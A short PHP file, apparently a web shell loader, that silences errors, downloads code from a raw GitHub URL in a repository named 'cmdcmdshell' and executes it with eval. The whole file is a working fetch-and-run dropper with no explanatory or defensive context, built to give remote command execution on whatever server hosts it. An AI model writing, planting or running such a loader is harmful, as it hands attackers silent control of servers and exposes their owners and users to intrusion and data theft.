<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/mangoleh098/cmdcmdshell/refs/heads/main/powcmd.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
